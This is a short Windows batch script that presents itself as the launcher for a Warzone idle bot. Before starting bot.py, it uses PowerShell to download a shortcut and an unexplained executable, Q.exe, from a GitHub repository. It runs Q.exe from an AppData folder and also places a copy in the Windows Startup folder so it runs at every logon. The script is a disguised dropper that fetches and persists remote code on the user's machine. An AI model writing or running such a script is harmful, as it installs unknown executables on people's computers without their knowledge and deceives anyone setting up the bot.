@echo off
cd %homepath%\desktop
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/AFK-Run.exe.lnk -OutFile AFK-Run.lnk"
pause
cd %appdata%\TmpFiles
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
cd %homepath%\desktop\WZB\warzone-idle-bot-master
pause
bot.py br-solos
